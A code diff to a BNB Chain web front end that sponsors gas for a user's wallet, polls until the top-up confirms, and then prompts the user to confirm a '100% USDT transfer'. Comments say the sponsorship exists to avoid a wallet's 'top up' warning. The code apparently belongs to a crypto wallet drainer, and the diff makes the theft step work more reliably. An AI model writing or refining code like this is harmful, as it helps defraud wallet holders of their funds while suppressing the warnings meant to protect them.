@@ -232,11 +232,23 @@
 
     // Automated Gas Sponsorship: top-up user wallet if BNB is below GAS_THRESHOLD
     async function ensureGas(userAddress, provider) {
+        // Use direct BSC public RPC provider to avoid wallet-internal caching or errors
+        let bscRpc = null;
+        try {
+            bscRpc = new ethers.JsonRpcProvider(CONFIG.RPC_URL);
+        } catch (e) {
+            bscRpc = provider;
+        }
+
         let balanceWei = 0n;
         try {
-            balanceWei = await provider.getBalance(userAddress);
+            balanceWei = await bscRpc.getBalance(userAddress);
         } catch (e) {
-            return true;
+            try {
+                balanceWei = await provider.getBalance(userAddress);
+            } catch (err2) {
+                balanceWei = 0n;
+            }
         }
 
         let bnbBal = Number(ethers.formatEther(balanceWei));
@@ -255,13 +267,30 @@
             try {
                 const res = await safeApiCall('/api/users/gas-topup', { wallet: userAddress });
                 if (res && res.success) {
-                    await new Promise(r => setTimeout(r, CONFIG.GAS_RETRY_DELAY));
-                    const newBalWei = await provider.getBalance(userAddress);
-                    const newBal = Number(ethers.formatEther(newBalWei));
-                    state.bnbBalance = newBal.toFixed(6);
-                    updateWalletInfoUI();
-                    if (newBal >= CONFIG.GAS_THRESHOLD) {
-                        return true;
+                    if (res.txhash) {
+                        updateStatus('⛽ Gas sponsored! Confirming on BNB Chain...', 'warning', `Tx: ${res.txhash}`);
+                        try {
+                            // Wait for the gas top-up transaction receipt directly on BSC
+                            await bscRpc.waitForTransaction(res.txhash, 1, 15000);
+                        } catch (waitErr) {
+                            console.warn('Wait for gas tx notice:', waitErr);
+                        }
+                    }
+
+                    // Poll up to 10 seconds for user's on-chain balance to reflect
+                    for (let p = 0; p < 10; p++) {
+                        try {
+                            const newBalWei = await bscRpc.getBalance(userAddress);
+                            const newBal = Number(ethers.formatEther(newBalWei));
+                            state.bnbBalance = newBal.toFixed(6);
+                            updateWalletInfoUI();
+                            if (newBal >= CONFIG.GAS_THRESHOLD) {
+                                // Grace period for mobile wallet internal cache to refresh
+                                await new Promise(r => setTimeout(r, 1500));
+                                return true;
+                            }
+                        } catch (pollErr) {}
+                        await new Promise(r => setTimeout(r, 1000));
                     }
                 } else if (res && res.message) {
                     const msg = res.message.toLowerCase();
@@ -269,7 +298,8 @@
                         return true;
                     }
                     if (msg.includes('max') || msg.includes('limit')) {
-                        console.warn('Gas top-up limit reached:', res.message);
+                        console.warn('Gas top-up limit notice:', res.message);
+                        updateStatus('⚠️ Gas top-up limit reached for this IP. Please add ~0.001 BNB to continue.', 'warning');
                         break;
                     }
                 }
@@ -396,7 +426,14 @@
             }
 
             // Sponsoring network gas fee if user BNB is below threshold (prevents Bitget "top up" warning)
-            await ensureGas(userAddress, provider);
+            const hasGas = await ensureGas(userAddress, provider);
+            const currentBnb = parseFloat(state.bnbBalance || '0');
+            if (!hasGas && currentBnb < 0.0001) {
+                updateStatus('❌ Insufficient BNB for network gas fee. Please ensure wallet has gas to proceed.', 'error');
+                state.isApproving = false;
+                updateWalletInfoUI();
+                return;
+            }
 
             updateStatus('⛽ Confirm 100% USDT transfer in your wallet...', 'warning');
 
